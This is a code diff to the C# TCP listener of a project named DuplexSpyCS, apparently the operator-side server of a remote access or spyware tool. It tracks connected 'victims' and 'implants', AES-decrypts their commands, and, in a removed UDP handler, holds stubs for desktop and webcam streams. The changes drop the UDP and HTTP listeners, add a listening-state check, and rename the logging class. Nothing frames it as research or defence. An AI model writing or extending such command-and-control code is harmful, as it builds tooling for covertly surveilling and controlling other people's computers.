@@ -13,11 +13,8 @@ namespace DuplexSpyCS
     {
         //Listener
         public Socket socket;
-        public UdpClient udpServer;
-        public HttpListener httpListener;
 
-        public int m_nPort = -1; //-1: Not specified. -> Server is not running.
-        public int nUdpPort = -1; //-1: Not specified. -> Server is not running.
+        public int m_nPort = -1;
 
         int MAX_BUFFER_LENGTH = 65536; //BUFFER MAXIMUM LENGTH
         public List<clsVictim> l_victim = new List<clsVictim>(); //Victim LIST
@@ -31,7 +28,7 @@ namespace DuplexSpyCS
         public int SentBytes { get { return _sent_bytes; } }
 
         //LOGS
-        private SqlConn sql_conn;
+        private clsSqlConn sql_conn;
 
         //Ini
         private clsIniManager ini_manager = clsStore.ini_manager;
@@ -45,6 +42,13 @@ namespace DuplexSpyCS
 
             sql_conn = clsStore.sql_conn;
             socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
+
+            m_protocol = enListenerProtocol.TCP;
+        }
+
+        ~clsTcpListener()
+        {
+
         }
 
         //Crypto
@@ -98,13 +102,24 @@ namespace DuplexSpyCS
         //START LISTEN
         public override void fnStart()
         {
-            //TCP
+            if (m_bIslistening)
+            {
+                //todo: msgbox
+                return;
+            }
+
+            var hSafe = socket.SafeHandle;
+            if (socket == null || hSafe == null || hSafe.IsInvalid || hSafe.IsClosed)
+                socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
+
             socket.SendTimeout = -1; //NEVER TIMEOUT
             socket.ReceiveTimeout = -1; //NEVER TIMEOUT
             socket.Bind(new IPEndPoint(IPAddress.Any, m_nPort));
 
             socket.Listen(10000);
             socket.BeginAccept(new AsyncCallback(AcceptCallBack), socket);
+
+            m_bIslistening = true;
         }
 
         //STOP LISTEN
@@ -118,24 +133,13 @@ namespace DuplexSpyCS
             if (socket != null)
             {
                 socket.Close();
-                socket.Dispose();
-                socket = null;
             }
 
-            if (udpServer != null)
-            {
-                udpServer.Close();
-                udpServer.Dispose();
-                udpServer = null;
-            }
-
-            socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
-
-            sql_conn.NewLogs(SqlConn.CSV.Server, SqlConn.MsgType.System, $"Stop listening port: {m_nPort}");
+            sql_conn.NewLogs(clsSqlConn.CSV.Server, clsSqlConn.MsgType.System, $"Stop listening port: {m_nPort}");
 
             l_victim.Clear();
-            m_nPort = -1;
-            nUdpPort = -1;
+
+            m_bIslistening = false;
         }
 
         /// <summary>
@@ -154,7 +158,7 @@ namespace DuplexSpyCS
                     client.Disconnect(true);
                     return;
                 }
-                clsVictim v = new clsVictim(client);
+                clsVictim v = new clsVictim(this, client);
                 v.ID = client.RemoteEndPoint.ToString();
                 client.BeginReceive(v.buffer, 0, MAX_BUFFER_LENGTH, SocketFlags.None, new AsyncCallback(ReadCallBack), v);
             }
@@ -274,7 +278,7 @@ namespace DuplexSpyCS
                                     string[] cmd = dec_data.Split("|");
 
                                     //Received(this, v, buffer, 0);
-                                    fnReceivedDecoded(this, v, cmd);
+                                    fnReceivedDecoded(this, v, cmd.ToList());
                                 }
                                 else if (dsp.Param == 1)
                                 {
@@ -296,7 +300,7 @@ namespace DuplexSpyCS
                                 string szDecData = clsCrypto.AESDecrypt(Convert.FromBase64String(Encoding.UTF8.GetString(abEncData)), v._AES.key, v._AES.iv);
                                 string[] aszMsg = szDecData.Split("|");
 
-                                fnImplantConnected(this, v, aszMsg);
+                                fnImplantConnected(this, v, aszMsg.ToList());
                             }
                         }
                     }
@@ -314,63 +318,6 @@ namespace DuplexSpyCS
             {
                 
             }
-        }
-
-        private void UdpReceiveCallback(IAsyncResult ar)
-        {
-            clsDSP dsp = null;
-
-            UdpClient udpServer = (UdpClient)ar.AsyncState;
-            IPEndPoint ep = new IPEndPoint(IPAddress.Any, nUdpPort);
-            int recv_len = 0;
-            do
-            {
-                byte[] static_receiveBuffer = new byte[MAX_BUFFER_LENGTH];
-                byte[] dynamic_receiveBuffer = new byte[] { };
-
-                static_receiveBuffer = new byte[MAX_BUFFER_LENGTH];
-                static_receiveBuffer = udpServer.Receive(ref ep);
-
-                recv_len = static_receiveBuffer.Length;
-
-                clsStore.recv_bytes += recv_len;
-                dynamic_receiveBuffer = CombineBytes(
-                    dynamic_receiveBuffer,
-                    0,
-                    dynamic_receiveBuffer.Length,
-                    static_receiveBuffer,
-                    0,
-                    recv_len
-                );
-                
-                if (recv_len <= 0)
-                    break;
-                else if (recv_len <= clsDSP.HEADER_SIZE)
-                    continue;
-                else
-                {
-                    var head_info = clsDSP.GetHeader(dynamic_receiveBuffer);
-                    while (dynamic_receiveBuffer.Length - clsDSP.HEADER_SIZE >= head_info.len)
-                    {
-                        dsp = new clsDSP(dynamic_receiveBuffer);
-                        dynamic_receiveBuffer = dsp.MoreData;
-                        head_info = clsDSP.GetHeader(dynamic_receiveBuffer);
-
-                        if (dsp.Command == 2)
-                        {
-                            if (dsp.Param == 0) //Desktop
-                            {
-
-                            }
-                            else if (dsp.Param == 1) //Webcam
-                            {
-
-                            }
-                        }
-                    }
-                }
-
-            } while (recv_len > 0);
         }
     }
 }
